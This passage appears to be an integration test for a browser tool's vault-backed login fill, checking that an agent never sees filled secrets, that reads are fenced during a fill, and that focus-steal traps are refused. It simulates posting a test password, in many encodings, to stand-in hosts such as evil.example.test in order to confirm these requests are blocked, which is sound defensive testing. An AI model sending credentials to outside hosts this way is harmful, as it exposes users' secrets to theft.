  const ROOT4 = scratch('vl-r22-fk');
  fs.rmSync(ROOT4, { recursive: true, force: true });
  const DATA = path.join(ROOT4, 'data'), HOME = path.join(ROOT4, 'home'), BIN = path.join(ROOT4, 'bin'), XDG = path.join(ROOT4, 'xdg');
  for (const d of [DATA, path.join(HOME, '.agent-browser'), BIN, XDG]) fs.mkdirSync(d, { recursive: true, mode: 0o700 });

  // Fake agent-browser binary to prove zero spawns on `fill --vault`
  const AB_LOG = path.join(ROOT4, 'ab-spawns.log');
  fs.writeFileSync(path.join(BIN, 'agent-browser'), `#!${process.execPath}
const fs = require('fs');
fs.appendFileSync(${JSON.stringify(AB_LOG)}, JSON.stringify(process.argv.slice(2)) + '\\n');
if (process.argv[2] === '--version') { console.log('${BV.TABLE_VERSION}'); process.exit(0); }
console.log(JSON.stringify({ success: true, data: { ok: true } }));
`, { mode: 0o755 });
  const abSpawns = () => (fs.existsSync(AB_LOG) ? fs.readFileSync(AB_LOG, 'utf8').trim().split('\n').filter(Boolean).length : 0);

  let clock = 1_750_000_000_000;
  const DAY = 86_400_000;
  const eng = VE.create({ dataDir: DATA, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
  const VPW = 'VaultR22#' + crypto.randomBytes(6).toString('hex');
  await eng.setup(VPW);
  const grants = GS.create({ memory: true });

  const fyItems = new Map();
  let fySeq = 0;
  const forYou = {
    add(profileId, item) {
      const id = `ut-r22fk${String(++fySeq).padStart(3, '0')}`;
      fyItems.set(id, { id, profileId, status: 'open', ...item });
      return id;
    },
    resolve(id) { const it = fyItems.get(id); if (it) it.status = 'done'; },
    list({ status } = {}) { return [...fyItems.values()].filter((x) => !status || x.status === status); },
  };

  let totpCalls = 0;
  let isTakeover = false;
  const hubLogs = [];
  const logSink = { log: (l) => hubLogs.push(String(l)), warn: (l) => hubLogs.push(String(l)), error: (l) => hubLogs.push(String(l)) };
  const OTP_VAL = '482910';
  const logins = Lm.create({
    vault: eng,
    grants: () => grants,
    totpCode: (name) => { totpCalls++; return name === 'shop-2fa' ? { ok: true, code: OTP_VAL } : { ok: false, code: 'no_totp' }; },
    forYou,
    now: () => clock,
    log: (l) => hubLogs.push(String(l)),
  });

  const PW_ALICE = 'AliceCur!' + crypto.randomBytes(6).toString('hex');
  const ENTRY_ALICE = BL.entryName('https://shop.example.test', 'alice');
  const missingTotpAdd = logins.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_ALICE, totpName: 'no-such-totp' }, { who: 'owner' });
  ok(!missingTotpAdd.ok && missingTotpAdd.code === 'bad_totp' && !eng.hasEntry(ENTRY_ALICE),
    'm6: addOwn refuses totpName pointing to a non-existent Vault TOTP entry (bad_totp)', missingTotpAdd);
  eng.secretPut('totp:shop-2fa', 'JBSWY3DPEHPK3PXP');
  logins.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_ALICE, totpName: 'shop-2fa' }, { who: 'owner' });
  grants.set('browser-login', 'https://shop.example.test#*', { to: [{ kind: 'conversation', key: 'conv-fk-1' }], except: [] });

  const keeper = BK.create({
    rootDir: DATA, dataDir: DATA, profilesRoot: path.join(DATA, 'profiles'), runtimeRoot: path.join(DATA, 'run'),
    log: quiet, launchImpl: async () => { throw new Error('no launch'); },
  });
  const prof = keeper.createProfile({ label: 'ShopProfile' }, { owner: { kind: 'instance', id: null } });
  const PID = prof.id, KEY = 'bk-0000f22a', SID = 'sess-fk-1', CID = 'conv-fk-1', TOKEN = `vsst_${crypto.randomBytes(12).toString('hex')}`;

  const fk = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
  const tid = fk.targets()[0].targetId;

  let b21ccCur = null; // B-21cc (r2491): this world's session's CURRENT tab — the one its scene last made current, else its first
  const stubKeeper = {
    currentTabOf: async () => ({ ok: true, targetId: b21ccCur || tid }), // the stand-in for the keeper's own read (its session's `tab list`, the row marked active)
    resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
    attach: async () => ({ profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, env: [], pinTab: false, others: 0 }),
    statusFor: () => ({ ephemeral: null, leases: [{ profileId: PID, browserKey: KEY, sessionId: SID }] }),
    socketRootOf: () => ({ socketDir: path.join(XDG, 'ab'), runtimeDir: XDG }),
    configFileFor: () => null,
    clock: () => clock,
    profile: (id) => (id === PID ? prof : null),
    profileByRef: (r) => (r === PID || r === 'shop' ? prof : null),
    setFor: () => ({ attachments: [{ profileId: PID, alias: 'shop', label: 'ShopProfile', isDefault: true }], handles: ['shop'] }),
    audit() {},
    noteLeaseUrl() {},
    leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID }],
    inputStateFor: () => ({ input: isTakeover ? 'user' : 'agent', takenAt: isTakeover ? clock : 0 }),
    ephemeralFor: () => null,
    cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: fk.wsUrl } : { ok: false }),
    onLease: () => () => {},
    saveLoginFenceState: (id, st) => keeper.saveLoginFenceState(id, st),
    loginFenceStateOf: (id) => keeper.loginFenceStateOf(id),
    loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fk.wsUrl), label: prof.label, action }),
  };

  const watch = Dm.create({
    keeper: stubKeeper,
    log: logSink,
    enableTimeoutMs: 400,
    now: () => clock,
    holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
    leaseCountOf: () => 1,
    labelOf: () => 'ShopProfile',
    logins,
    takeoverOf: () => isTakeover,
    conversationOf: () => ({ cid: CID, name: 'Shop Agent' }),
  });
  { const noteKeep = watch.noteActiveTab; watch.noteActiveTab = (t, id) => { b21ccCur = id || b21ccCur; return noteKeep(t, id); }; } // B-21cc: a tab the scene makes current is its session's current one

  const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Shop Agent', cwd: ROOT4, backendSessionId: CID }]]);
  Rm.setup({ keeper: stubKeeper, activeSessions: sessions, dialogs: watch, logins, tasksForSession: () => [] });

  const app = express();
  app.use(express.json());
  app.use(Rm.router);
  VRm.registerVaultRoutes(app, {
    vault: eng,
    activeSessions: sessions,
    logins,
    who: () => 'owner',
    log: () => {},
  });
  const srv = http.createServer(app);
  const port = await freePort();
  await new Promise((r) => srv.listen(port, '127.0.0.1', r));
  const API = `http://127.0.0.1:${port}`;

  const PWF = path.join(ROOT4, 'passwd.cjs');
  fs.writeFileSync(PWF, `const os = require('os'); const real = os.userInfo; os.userInfo = (o) => ({ ...real(o), homedir: ${JSON.stringify(HOME)} });\n`);
  fs.mkdirSync(path.join(XDG, 'ab'), { recursive: true, mode: 0o700 });
  const cliEnv = {
    PATH: `${BIN}:${path.dirname(process.execPath)}:/usr/bin:/bin`,
    HOME,
    XDG_RUNTIME_DIR: XDG,
    VIBESPACE_API: API,
    VIBESPACE_SESSION_TOKEN: TOKEN,
    VIBESPACE_SESSION_CWD: ROOT4,
  };
  const runCli = (args) => new Promise((resolve) => {
    const c = spawn(process.execPath, ['--require', PWF, path.join(REPO, 'data/bin/vibespace-browser'), ...args], { env: cliEnv, cwd: ROOT4 });
    let out = '', err = '';
    c.stdout.on('data', (d) => { out += d; });
    c.stderr.on('data', (d) => { err += d; });
    c.on('exit', (code) => resolve({ code, out, err }));
  });
  const reqJson = async (method, p, body, headers = {}) => {
    const r = await fetch(API + p, {
      method,
      headers: { ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}), ...headers },
      body: body !== undefined ? JSON.stringify(body) : undefined,
    });
    const text = await r.text();
    let json = null; try { json = JSON.parse(text); } catch {}
    return { status: r.status, json, text };
  };
  const agentHdr = { Authorization: `Bearer ${TOKEN}` };
  const ownerHdr = { Origin: API };

  try {
    await watch.arm(PID);
    const hasPrimitive = ok(typeof watch.fillVaultField === 'function' && typeof watch.noteSnapshot === 'function', 'browser-dialogs exports fillVaultField + noteSnapshot');

    // Ruling 3: `vibespace-browser login` is retired + old `/api/agent/browser/login` route is gone
    const retCli = await runCli(['login']);
    const oldRoute = await reqJson('POST', '/api/agent/browser/login', { profile: PID }, agentHdr);
    ok(retCli.code === 1 && /\[login_retired\]/.test(retCli.err) && /fill @ref --vault/.test(retCli.err) && oldRoute.status === 404,
      'RULING 3: `vibespace-browser login` exits 1 [login_retired] teaching snapshot+fill --vault, and POST /api/agent/browser/login is 404',
      { code: retCli.code, err: retCli.err.trim(), oldStatus: oldRoute.status });

    if (hasPrimitive) {
      // Set up login + hijack + iframe + text-input DOM on fake kernel
      fk.setDom(tid, {
        url: 'https://shop.example.test/login',
        childFrames: [{ id: `${tid}-CF1`, url: 'https://embed.example.test/form' }],
        elements: [
          { id: 'u', tag: 'input', type: 'email', name: 'Email' },
          { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
          { id: 'otp', tag: 'input', type: 'text', name: 'One-time code' },
          { id: 'plain', tag: 'input', type: 'text', name: 'Plain text' },
          { id: 'decoy', tag: 'input', type: 'password', name: 'Decoy' },
          { id: 'trap_focus', tag: 'input', type: 'password', name: 'Trap focus', focusHijackId: 'decoy' },
          { id: 'trap_clear', tag: 'input', type: 'password', name: 'Trap clear', value: 'prefilled', hijackBeforeInsert: true },
          { id: 'frame_el', tag: 'iframe', type: 'iframe', name: 'Frame host' },
          { id: 'sub_pw', tag: 'input', type: 'password', name: 'Child password', frameId: `${tid}-CF1` },
        ],
      });
      // B-21cc (the agent feedback fb-2450b6f77a: «fill @e3 --vault» answered target_not_found right after `snapshot -i` showed ref=e3;
      // the CSS selector for the same field worked): agent-browser 0.38.2 prints a field's attributes and its ref in ONE bracket — a
      // sign-in page marks its fields required («[required, ref=e1]»; the box's own listing: «[level=1, ref=e18]»). THE LAW: a ref of the
      // latest snapshot is a target for the vault fill exactly as for a plain fill. The listing in that form ⇒ the vault fill BY REF
      // LANDS (the value read back from the page, the receipt as today, the secret never in the agent's output).
      // RED: today's line scan (a bracket exactly «[ref=…]», re-created in a copy) leaves both refs out ⇒ the fill answers
      // [target_not_found] «Element not found: @e1» — the reported refusal.
      {
        const REQ = '- heading "Sign in" [level=1, ref=e9]\n- textbox "Email" [required, ref=e1]\n- textbox "Password" [required, ref=e2]\n- checkbox "Remember me" [checked=false, ref=e8]';
        const bvSrc = fs.readFileSync(path.join(REPO, 'src/browser-verbs.js'), 'utf8');
        const MB = mutantCopies('b21cc-ref-scan', REPO);
        const BV_OLD = MB.load('src/browser-verbs.js', anchored(bvSrc, '    if (!ref) continue;\n    pushRef(ref, role, name, nth);',
          '    { const rm = /\\[ref=([A-Za-z0-9_-]+)\\]/.exec(line); if (!rm) continue; const nm = /\\[nth=(\\d+)\\]/.exec(line); pushRef(rm[1], role, name, nm ? Number(nm[1]) : null); }', 'b21cc-exact-bracket'), 'b21cc-exact-bracket');   // stale-pins: kept — the RED re-creates today's exact-bracket scan on purpose
        const refsNew = BV.parseSnapshotRefs(REQ), refsOld = BV_OLD.parseSnapshotRefs(REQ);
        ok(JSON.stringify(refsNew.map((r) => [r.ref, r.role, r.name])) === JSON.stringify([['@e9', 'heading', 'Sign in'], ['@e1', 'textbox', 'Email'], ['@e2', 'textbox', 'Password'], ['@e8', 'checkbox', 'Remember me']]) && refsOld.length === 0,
          'B-21cc: every ref of a 0.38.2 listing is read, attributes beside it in its bracket (required, level, checked); CONTROL: today\'s scan reads NONE of them', { refsNew, refsOld });
        // the edges: a ref at the line's END after a value (a driver that prints the value first) is read; a «[ref=…]» inside the page's
        // quoted NAME is the page's words — never a ref (today's scan took the first one anywhere: the page could name another field's ref)
        const EDGE = '- spinbutton "Month": 1 [ref=e5]\n- textbox "Card [ref=e1]" [ref=e6]\n- textbox "Email" [ref=e7]: [ref=e2]';
        const eNew = BV.parseSnapshotRefs(EDGE).map((r) => r.ref), eOld = BV_OLD.parseSnapshotRefs(EDGE).map((r) => r.ref);
        ok(JSON.stringify(eNew) === JSON.stringify(['@e5', '@e6', '@e7']) && JSON.stringify(eOld) === JSON.stringify(['@e5', '@e1', '@e7']),
          'B-21cc: a ref after a value is read; a «[ref=…]» in the quoted name or in the value is never one (RED: today\'s scan read the name\'s «@e1» as the field\'s ref)', { eNew, eOld });
        // round w620gd7gd (主开发 r1089 2): THE WRONG-FIELD CLASS — two fields of one role and one name, the first attributed, the second
        // plain: the scan counts them 0 then 1, as the hub's query counts the page's fields. RED: the release's scan skipped the first, so
        // the second got index 0 — and the hub's nth 0 is the FIRST field: a fill of the second ref landed in the first's field. The same
        // pair in the driver's own index forms («[ref=e3, nth=1]», «[ref=e3] [nth=1]») gives 0 then 1 too.
        const nthOf = (M, t) => M.parseSnapshotRefs(t).map((r) => [r.ref, r.nth]);
        const PAIR = '- textbox "Password" [required, ref=e2]\n- textbox "Password" [ref=e3]';
        const PAIR_IN = '- textbox "Password" [required, ref=e2]\n- textbox "Password" [ref=e3, nth=1]';
        const PAIR_SEP = '- textbox "Password" [required, ref=e2]\n- textbox "Password" [ref=e3] [nth=1]';
        const dup = { plain: nthOf(BV, PAIR), inBracket: nthOf(BV, PAIR_IN), sep: nthOf(BV, PAIR_SEP), oldPlain: nthOf(BV_OLD, PAIR), oldIn: nthOf(BV_OLD, PAIR_IN), oldSep: nthOf(BV_OLD, PAIR_SEP) };
        const ZERO_ONE = JSON.stringify([['@e2', 0], ['@e3', 1]]);
        ok(JSON.stringify(dup.plain) === ZERO_ONE && JSON.stringify(dup.inBracket) === ZERO_ONE && JSON.stringify(dup.sep) === ZERO_ONE,
          'B-21cc (round w620gd7gd): two fields of one role and name, the first attributed — counted 0 then 1, in the plain form and in both index forms', dup);
        ok(JSON.stringify(dup.oldPlain) === JSON.stringify([['@e3', 0]]),
          'B-21cc RED: the release\'s scan gave the SECOND field index 0 — the hub\'s nth 0 is the first field, so its fill landed in the first\'s field', dup.oldPlain);
        // a quoted attribute is the page's words: a comma inside it does not split (its «ref=» is never the field's)
        const quoted = BV.parseSnapshotRefs('- textbox "Card" [value="x, ref=e9, y", ref=e3]').map((r) => r.ref);
        ok(JSON.stringify(quoted) === JSON.stringify(['@e3']), 'B-21cc (round w620gd7gd): a comma inside a quoted attribute does not split — the page\'s «ref=e9» is never read', quoted);
        // a page's long run of «[» (text the full snapshot prints): the line-end bracket is read from the LAST «[» only, with an anchored
        // test — linear BY CONSTRUCTION (the clock is never the judge here, and the work meter counts no regex's steps): the source pin
        // holds that construction, and a run of 40 000 «[» reads no ref
        const runRefs = BV.parseSnapshotRefs('- paragraph: ' + '['.repeat(40000));
        ok(runRefs.length === 0 && bvSrc.includes("const lb = tail.lastIndexOf('['); const end = lb >= 0 ? /^\\[[^\\]\\n]*\\]\\s*$/.exec(tail.slice(lb)) : null;") && !bvSrc.includes('/\\[[^\\]\\n]*\\]\\s*$/.exec(tail)'),   // stale-pins: kept — an absence check: the unanchored end regex must not come back
          'B-21cc (round w620gd7gd): the line-end bracket is read from the last «[» with an anchored test (an unanchored end regex over the tail was quadratic on a page\'s run of «[»); 40 000 «[» read no ref', { refs: runRefs.length });
        await watch.noteSnapshot({ profileId: PID, browserKey: KEY }, { parsedRefs: refsOld });
        const oldUser = await runCli(['fill', '@e1', '--vault', 'shop.example.test#alice/user']);
        await watch.noteSnapshot({ profileId: PID, browserKey: KEY }, REQ);   // the hub parses the listing with the tree's parser
        const reqUser = await runCli(['fill', '@e1', '--vault', 'shop.example.test#alice/user']);
        const reqPw = await runCli(['fill', '@e2', '--vault', 'shop.example.test#alice/password']);
        const vReq = fk.readDomValues(tid);
        ok(reqUser.code === 0 && reqPw.code === 0 && vReq.u === 'alice' && vReq.pw === PW_ALICE && !reqPw.out.includes(PW_ALICE) && !reqPw.err.includes(PW_ALICE) && /Receipt vr-[0-9a-f]{12}\./.test(reqPw.out),
          'B-21cc: a vault fill BY REF lands on fields the listing prints «[required, ref=…]» — the value in the page, the receipt as today, the secret never in the agent\'s output', { vals: vReq, out: reqPw.out.trim(), err: reqPw.err.trim() });
        ok(oldUser.code === 1 && /\[target_not_found\]/.test(oldUser.err) && /Element not found: @e1/.test(oldUser.err) && /snapshot -i/.test(oldUser.err),
          'B-21cc RED: with today\'s scan the same fill is refused [target_not_found] «Element not found: @e1 … snapshot -i» — the reported refusal (and the name the plain fill\'s driver uses)', oldUser.err.trim());
      }
      await watch.noteSnapshot(
        { profileId: PID, browserKey: KEY },
        '- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]\n- textbox "One-time code" [ref=e3]\n- textbox "Plain text" [ref=e4]\n- textbox "Trap focus" [ref=e5]\n- textbox "Trap clear" [ref=e6]\n- textbox "Child password" [ref=e7]',
      );

      const spawns0 = abSpawns();
      const cUser = await runCli(['fill', '@e1', '--vault', 'shop.example.test#alice/user']);
      const cPass = await runCli(['fill', '@e2', '--vault', 'shop.example.test#alice/password']);
      const cOtp = await runCli(['fill', '@e3', '--vault', 'shop.example.test#alice/otp']);
      const vals1 = fk.readDomValues(tid);
      ok(cUser.code === 0 && cPass.code === 0 && cOtp.code === 0 && abSpawns() === spawns0
        && vals1.u === 'alice' && vals1.pw === PW_ALICE && vals1.otp === OTP_VAL && totpCalls === 1
        && !cPass.out.includes(PW_ALICE) && !cPass.err.includes(PW_ALICE) && !cOtp.out.includes(OTP_VAL)
        && /Receipt vr-[0-9a-f]{12}\./.test(cPass.out),
        'RULING 4 & 5a + r26 (restated by r2711): `fill @ref --vault` resolves Hub backendNodeId and inserts the value itself — NO agent-browser spawn carries the value (over this stub keeper: none at all; the real keeper\'s one spawn, the current tab\'s `tab list`, is asserted in test-browser-front-tab), mints OTP once (totpCalls===1), populates main-world input.value, and leaks zero secret',
        { spawnsDelta: abSpawns() - spawns0, vals1, out: cPass.out.trim() });

      // Ruling 4: live-fill read fence blocks eval/get/screenshot with 409 login_fill_live while allowing click/press
      const resEval = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', 'document.querySelector("#pw").value'] }, agentHdr);
      const resGet = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['get', 'value', '@e2'] }, agentHdr);
      const resShot = await reqJson('POST', '/api/agent/browser/direct', { profile: PID, action: 'screenshot' }, agentHdr);
      const resClick = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '@e1'] }, agentHdr);
      ok(resEval.status === 409 && resEval.json?.code === 'login_fill_live'
        && resGet.status === 409 && resGet.json?.code === 'login_fill_live'
        && resShot.status === 409 && resShot.json?.code === 'login_fill_live'
        && resClick.status === 200,
        'RULING 4: before submit, eval / get value / screenshot are refused 409 login_fill_live while click passes',
        { eval: resEval.status, get: resGet.status, shot: resShot.status, click: resClick.status });

      // Accidental cross-origin credential leak fence across L1 encodings + deduplicated For-you notice + fail-closed undecodable bodies (Ruling A)
      const hasL1Exports = ok(
        typeof Dm.credSigOf === 'function'
          && typeof Dm.inspectRequestBody === 'function'
          && typeof Dm.bodyCarriesCredential === 'function'
          && typeof Dm.urlCarriesCredential === 'function'
          && typeof Dm.headersCarryCredential === 'function',
        'L1: browser-dialogs exports credSigOf + inspectRequestBody + bodyCarriesCredential + urlCarriesCredential + headersCarryCredential',
      );
      if (hasL1Exports) {
        const sigsAlice = [Dm.credSigOf(PW_ALICE)].filter(Boolean);
        const mpBoundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
        const mpCt = `multipart/form-data; boundary=${mpBoundary}`;
        const mpSecretBody = `--${mpBoundary}\r\nContent-Disposition: form-data; name="user"\r\n\r\nalice\r\n--${mpBoundary}\r\nContent-Disposition: form-data; name="pw"\r\n\r\n${PW_ALICE}\r\n--${mpBoundary}--\r\n`;
        const mpBenignBody = `--${mpBoundary}\r\nContent-Disposition: form-data; name="note"\r\n\r\nharmless-ping\r\n--${mpBoundary}--\r\n`;
        const pwB64 = Buffer.from(PW_ALICE, 'utf8').toString('base64');

        const exUrl = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/collect', headers: { 'content-type': 'application/x-www-form-urlencoded' }, postData: `pw=${encodeURIComponent(PW_ALICE)}` });
        const exUrl2 = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/collect', headers: { 'content-type': 'application/x-www-form-urlencoded' }, postData: `pw=${encodeURIComponent(PW_ALICE)}` });
        const exJsonPlain = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/json1', headers: { 'content-type': 'application/json' }, postData: JSON.stringify({ pw: PW_ALICE }) });
        const exJsonNested = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/json2', headers: { 'content-type': 'application/json; charset=utf-8' }, postData: JSON.stringify({ meta: { v: 1 }, auth: { deep: { secret: PW_ALICE } } }) });
        const exMp = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/mp', headers: { 'content-type': mpCt }, postData: mpSecretBody });
        const exMpFallback = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/mp2', headers: { 'content-type': mpCt }, omitInlinePostData: true, fullPostData: mpSecretBody });
        const exTextCrlf = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/txt1', headers: { 'content-type': 'text/plain' }, postData: `user=alice\r\npw=${PW_ALICE}\r\n` });
        const exTextPref = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/txt2', headers: { 'content-type': 'text/plain' }, postData: `token:${PW_ALICE}` });
        const exB64Body = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/b64', headers: { 'content-type': 'text/plain' }, postData: `payload=${pwB64}` });
        const exQueryB64 = await fk.simulateSubmitRequest({ targetId: tid, method: 'GET', url: `https://evil.example.test/q?blob=${encodeURIComponent(pwB64)}`, postData: '' });
        const exCustomHdr = await fk.simulateSubmitRequest({ targetId: tid, method: 'POST', url: 'https://evil.example.test/hdr', headers: { 'x-api-secret': PW_ALICE, 'content-type': 'text/plain' }, postData: 'ok=1' });
        const exHarmlessMp = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/benign-mp', headers: { 'content-type': mpCt }, postData: mpBenignBody, finish: false });
        const exBinUndec = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-bin.example.test/bin', headers: { 'content-type': 'application/octet-stream' }, postData: 'raw-binary-bytes' });
        const exGzipUndec = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-bin.example.test/gz', headers: { 'content-type': 'application/json', 'content-encoding': 'gzip' }, postData: 'compressed' });
        const exMissingBody = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-bin.example.test/evicted', headers: { 'content-type': 'text/plain' }, omitInlinePostData: true, hasPostData: true, getPostDataError: 'No data found for resource' });

        const crossNotices = [...fyItems.values()].filter((x) => x.kind === 'notice' && /evil\.example\.test/.test(`${x.text || ''} ${x.detail || ''}`));
        const binNotices = [...fyItems.values()].filter((x) => x.kind === 'notice' && /evil-bin\.example\.test/.test(`${x.text || ''} ${x.detail || ''}`));
        ok(
          [exUrl, exUrl2, exJsonPlain, exJsonNested, exMp, exMpFallback, exTextCrlf, exTextPref, exB64Body, exQueryB64, exCustomHdr].every((r) => r.action === 'fail' && r.errorReason === 'BlockedByClient')
            && exHarmlessMp.action === 'continue'
            && [exBinUndec, exGzipUndec, exMissingBody].every((r) => r.action === 'fail' && r.errorReason === 'BlockedByClient')
            && crossNotices.length === 1
            && binNotices.length === 1
            && hubLogs.some((l) => /undecodable_body/.test(l))
            && Dm.bodyCarriesCredential(mpSecretBody, sigsAlice, mpCt) === true
            && Dm.bodyCarriesCredential(mpBenignBody, sigsAlice, mpCt) === false,
          'L1: cross-origin urlencoded / json / nested-json / multipart / Fetch.getRequestPostData / text-plain / base64 / GET-query / custom-header all BlockedByClient with 1 dedup notice; harmless multipart allowed; undecodable binary/gzip/evicted bodies fail closed + logged',
          { exMp, exHarmlessMp, exBinUndec, crossNotices: crossNotices.length, binNotices: binNotices.length },
        );

        // Same-origin submissions in all encodings are allowed; non-navigating submit wipes input.value === '' and lifts 409 fence!
        const sameJson = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/json', headers: { 'content-type': 'application/json' }, postData: JSON.stringify({ nested: { pw: PW_ALICE } }), finish: false });
        const sameMp = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/mp', headers: { 'content-type': mpCt }, postData: mpSecretBody, finish: false });
        const sameTxt = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/txt', headers: { 'content-type': 'text/plain' }, postData: `pw=${PW_ALICE}\r\n`, finish: false });
        const sameQuery = await fk.simulateSubmitRequest({ targetId: tid, method: 'GET', url: `https://shop.example.test/api/q?q=${encodeURIComponent(pwB64)}`, postData: '', finish: false });
        const subOk = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/login', headers: { 'content-type': 'application/x-www-form-urlencoded' }, postData: `u=alice&pw=${encodeURIComponent(PW_ALICE)}`, finish: true });
        for (let i = 0; i < 40 && !watch.liveFillVerdictFor({ profileId: PID, browserKey: KEY }, { verb: 'eval', argv: ['eval', '1'] }).ok; i++) {
          await new Promise((r) => setTimeout(r, 10));
        }
        const valsAfterSubmit = fk.readDomValues(tid);
        const resEvalAfter = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', '1+1'] }, agentHdr);
        ok([sameJson, sameMp, sameTxt, sameQuery, subOk].every((r) => r.action === 'continue') && valsAfterSubmit.pw === '' && resEvalAfter.status === 200,
          'L1 + RULING 4: same-origin urlencoded/json/multipart/text/query all continue; submit completion wipes input.value and lifts 409 fence',
          { valsAfterSubmit, evalStatus: resEvalAfter.status });
      }

      // Output scrubbing remains active after fence lift until browser stop
      const audScrub = await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'get', ok: true, output: { out: `leaked=${PW_ALICE}`, err: '' } }, agentHdr);
      ok(audScrub.status === 200 && !audScrub.text.includes(PW_ALICE) && /\[vault:web-login:/.test(audScrub.json?.scrubbed?.out || ''),
        'RULING 4: scrubOutput redacts filled secret from CLI output even after submit lifted the read fence', audScrub.json);

      // L5 + Ruling 5a (Ruling A accidental focus-steal guard): Focus-steal traps (sync, queueMicrotask, setTimeout(0) to <input type="text"> decoy + clear-steal) refused with ZERO chars typed!
      fk.setDom(tid, {
        url: 'https://shop.example.test/login',
        childFrames: [{ id: `${tid}-CF1`, url: 'https://embed.example.test/form' }],
        elements: [
          { id: 'u', tag: 'input', type: 'email', name: 'Email' },
          { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
          { id: 'plain', tag: 'input', type: 'text', name: 'Plain text' },
          { id: 'decoy_txt', tag: 'input', type: 'text', name: 'Decoy text' },
          { id: 'trap_sync', tag: 'input', type: 'password', name: 'Trap sync', focusHijackId: 'decoy_txt', focusHijackMode: 'sync' },
          { id: 'trap_micro', tag: 'input', type: 'password', name: 'Trap micro', focusHijackId: 'decoy_txt', focusHijackMode: 'microtask' },
          { id: 'trap_timeout', tag: 'input', type: 'password', name: 'Trap timeout', focusHijackId: 'decoy_txt', focusHijackMode: 'timeout' },
          { id: 'trap_clear', tag: 'input', type: 'password', name: 'Trap clear', value: 'prefilled', hijackBeforeInsert: true },
          { id: 'frame_el', tag: 'iframe', type: 'iframe', name: 'Frame host' },
          { id: 'sub_pw', tag: 'input', type: 'password', name: 'Child password', frameId: `${tid}-CF1` },
        ],
      });
      await watch.noteSnapshot(
        { profileId: PID, browserKey: KEY },
        '- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]\n- textbox "Plain text" [ref=e4]\n- textbox "Trap sync" [ref=e5]\n- textbox "Trap clear" [ref=e6]\n- textbox "Child password" [ref=e7]\n- textbox "Trap micro" [ref=e8]\n- textbox "Trap timeout" [ref=e9]',
      );
      const insertsBeforeTrap = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      const trapSync = await runCli(['fill', '@e5', '--vault', 'shop.example.test#alice/password']);
      const trapMicro = await runCli(['fill', '@e8', '--vault', 'shop.example.test#alice/password']);
      const trapTimeout = await runCli(['fill', '@e9', '--vault', 'shop.example.test#alice/password']);
      const trapClear = await runCli(['fill', '@e6', '--vault', 'shop.example.test#alice/password']);
      const insertsAfterTrap = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      const trapVals = fk.readDomValues(tid);
      const trapCounts = fk.readDomInputCounts ? fk.readDomInputCounts(tid) : { decoy_txt: { inputEvents: 0 } };
      ok(trapSync.code === 1 && /\[login_form_changed\]/.test(trapSync.err)
        && trapMicro.code === 1 && /\[login_form_changed\]/.test(trapMicro.err)
        && trapTimeout.code === 1 && /\[login_form_changed\]/.test(trapTimeout.err)
        && trapClear.code === 1 && /\[login_form_changed\]/.test(trapClear.err)
        && insertsAfterTrap === insertsBeforeTrap
        && trapVals.decoy_txt === '' && trapCounts.decoy_txt.inputEvents === 0
        && trapVals.trap_sync === '' && trapVals.trap_micro === '' && trapVals.trap_timeout === '' && trapVals.trap_clear === '',
        'L5 + RULING 5a: sync, queueMicrotask, and setTimeout(0) focus steals to <input type="text"> decoy all refuse login_form_changed with 0 Input.insertText calls and 0 decoy chars/events',
        { insertsBeforeTrap, insertsAfterTrap, trapVals, decoyEvents: trapCounts.decoy_txt });

      // Ruling 5b: Frame & unmasked input & origin refusals
      const fRef = await runCli(['fill', '@e7', '--vault', 'shop.example.test#alice/password']);
      const fSelChild = await runCli(['fill', '#sub_pw', '--vault', 'shop.example.test#alice/password']);
      const fSelTag = await runCli(['fill', '#frame_el', '--vault', 'shop.example.test#alice/password']);
      const badMask = await runCli(['fill', '@e4', '--vault', 'shop.example.test#alice/password']);
